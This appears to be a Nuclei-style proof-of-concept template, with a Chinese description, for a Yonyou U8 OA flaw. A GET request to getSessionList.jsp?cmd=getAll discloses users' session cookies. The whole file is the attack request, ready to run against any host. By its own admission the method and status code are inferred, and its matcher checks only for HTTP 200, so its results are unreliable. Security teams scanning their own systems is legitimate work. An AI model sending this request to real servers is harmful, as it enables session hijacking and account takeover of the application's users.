id: poc-79481234467213b49316
info:
  name: 用友U8OAgetSessionList.jsp用户cookie信息泄露漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: info-leak,2025
http:
- raw:
  - 'GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
